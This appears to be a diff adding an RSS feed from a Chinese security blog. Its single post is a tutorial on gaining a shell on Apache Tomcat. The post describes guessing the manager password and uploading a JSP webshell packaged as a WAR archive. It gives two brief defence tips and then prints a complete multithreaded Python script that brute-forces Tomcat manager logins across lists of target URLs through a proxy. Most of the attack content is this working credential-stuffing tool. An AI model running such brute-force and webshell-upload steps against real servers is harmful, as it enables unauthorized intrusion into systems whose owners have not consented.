@@ -1,0 +1,193 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Getshell on </title>
+    <link>http://wyb0.com/tags/getshell/</link>
+    <description>Recent content in Getshell on </description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <copyright>&amp;copy; 2016-2017 Reber. All Rights Reserved.</copyright>
+    <lastBuildDate>Tue, 02 Aug 2016 22:30:13 +0800</lastBuildDate>
+    <atom:link href="http://wyb0.com/tags/getshell/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>Tomcat部署War包getshell</title>
+      <link>http://wyb0.com/posts/Tomcat%E9%83%A8%E7%BD%B2War%E5%8C%85getshell/</link>
+      <pubDate>Tue, 02 Aug 2016 22:30:13 +0800</pubDate>
+      
+      <guid>http://wyb0.com/posts/Tomcat%E9%83%A8%E7%BD%B2War%E5%8C%85getshell/</guid>
+      <description>
+
+&lt;h3 id=&#34;0x00-关于war包:f7e5681da13019e03db2c75427cd09b8&#34;&gt;0x00 关于War包&lt;/h3&gt;
+
+&lt;blockquote&gt;
+&lt;pre&gt;&lt;code&gt;War包一般是进行Web开发时一个网站Project下的所有代码,包括前台HTML/CSS/JS代码,
+以及Java的代码。当开发人员开发完毕时,就会将源码打包给测试人员测试,测试完后若要发布
+则也会打包成War包进行发布。War包可以放在Tomcat下的webapps或word目录,当Tomcat
+服务器启动时,War包也会随之被解压后自动部署。
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&#34;0x01-上传war包getshell:f7e5681da13019e03db2c75427cd09b8&#34;&gt;0x01 上传War包GetShell&lt;/h3&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;找到后台猜密码然后登录
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/tomcat_vul_background.png&#34; alt=&#34;Tomcat后台&#34;&gt;
+&lt;/div&gt;
+
+&lt;br /&gt;&lt;br /&gt;
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/tomcat_vul_login.png&#34; alt=&#34;Tomcat后台登录&#34;&gt;
+&lt;/div&gt;
+
+&lt;br /&gt;&lt;br /&gt;
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/tomcat_vul_war_login_success.png&#34; alt=&#34;Tomcat后台登录成功&#34;&gt;
+&lt;/div&gt;
+&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;上传War包&lt;br /&gt;
+先将jsp大马压缩为zip，再将zip后缀改名为war，然后上传war包
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/tomcot_vul_put_war.png&#34; alt=&#34;Tomcat上传War包&#34;&gt;
+&lt;/div&gt;
+
+&lt;br /&gt;&lt;br /&gt;
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/tomcot_vul_put_war_success.png&#34; alt=&#34;Tomcat上传War包成功&#34;&gt;
+&lt;/div&gt;
+
+&lt;br /&gt;&lt;br /&gt;
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/tomcot_vul_visit_shell1.png&#34; alt=&#34;Tomcat部署War包后访问shell1&#34;&gt;
+&lt;/div&gt;
+
+&lt;br /&gt;&lt;br /&gt;
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/tomcot_vul_visit_shell2.png&#34; alt=&#34;Tomcat部署War包后访问shell2&#34;&gt;
+&lt;/div&gt;
+&lt;/p&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&#34;0x02漏洞防御:f7e5681da13019e03db2c75427cd09b8&#34;&gt;0x02漏洞防御&lt;/h3&gt;
+
+&lt;ul&gt;
+&lt;li&gt;后台使用强密码&lt;/li&gt;
+&lt;li&gt;删除Tomcat下的manager文件夹&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&#34;0x03-附爆破弱口令代码:f7e5681da13019e03db2c75427cd09b8&#34;&gt;0x03 附爆破弱口令代码&lt;/h3&gt;
+
+&lt;blockquote&gt;
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python
+#-*- coding:utf-8 -*-
+
+import requests
+import json
+import base64
+import sys
+import Queue
+import threading
+
+&amp;quot;&amp;quot;&amp;quot;
+简单爆破后台登陆密码
+Usage: python tomcat.py username.txt password.txt urlfile.txt
+username.txt为用户名字典
+password.txt为密码字典
+urlfile.txt为后台url列表
+&amp;quot;&amp;quot;&amp;quot;
+
+def get_username(userfile):
+    username = []
+    with open(userfile, &#39;r&#39;) as f:
+        lines = f.readlines()
+        for line in lines:
+            username.append(line.strip())
+    return username
+
+def get_pwd(passfile):
+    password = []
+    with open(passfile, &#39;r&#39;) as f:
+        lines = f.readlines()
+        for line in lines:
+            password.append(line.strip())
+    return password
+
+def get_url(urlfile):
+    urllist = Queue.Queue()
+    with open(urlfile,&#39;r&#39;) as f:
+        lines = f.readlines()
+        for line in lines:
+            urllist.put(line.strip())
+    return urllist
+
+def thread(f,urls,names,pwds):
+    while not urls.empty():
+        s = requests.Session()
+        url = urls.get()
+        resp = s.get(url,timeout=10)  #用于记录cookie
+        Referer = resp.url
+
+        headers = {
+            &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0&#39;,
+            &#39;Referer&#39;: Referer,
+        }
+        bgurl = url + &#39;manager/html&#39;
+        # print bgurl
+        for name in names:
+            for pwd in pwds:
+                authorize = name + &#39;:&#39; + pwd
+                Basic = &amp;quot;Basic &amp;quot; + base64.b64encode(authorize)
+                headers[&#39;Authorization&#39;] = Basic
+                # print json.dumps(headers, indent=4)
+
+                proxy = {
+                    &#39;http&#39;:&#39;http://127.0.0.1:1080&#39;
+                }
+
+                resp = s.get(bgurl,headers=headers,proxies=proxy,timeout=10)
+                if resp.status_code == 200:
+                    s = &amp;quot;[Ok] %s\t%s:%s&amp;quot; % (bgurl,name,pwd)
+                    print s
+                    f.write(s)
+                    exit()
+                else:
+                    print &#39;[Error] &#39; + bgurl + &#39;\t&#39; + name + &#39;:&#39; + pwd
+            # break
+
+def main():
+    if len(sys.argv) &amp;lt; 4:
+        print &amp;quot;Usage: python tomcat.py username.txt password.txt urlfile.txt&amp;quot;
+        exit()
+    userfile = sys.argv[1]
+    passfile = sys.argv[2]
+    urlfile = sys.argv[3]
+    names = get_pwd(userfile)
+    pwds = get_pwd(passfile)
+    urls = get_url(urlfile)
+
+    tlist = []
+    f = open(&amp;quot;result.txt&amp;quot;,&amp;quot;a+&amp;quot;)
+    for x in xrange(1,50):
+        t = threading.Thread(target=thread,args=(f,urls,names,pwds,))
+        tlist.append(t)
+    for t in tlist:
+        t.start()
+    t.join()
+
+main()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/blockquote&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
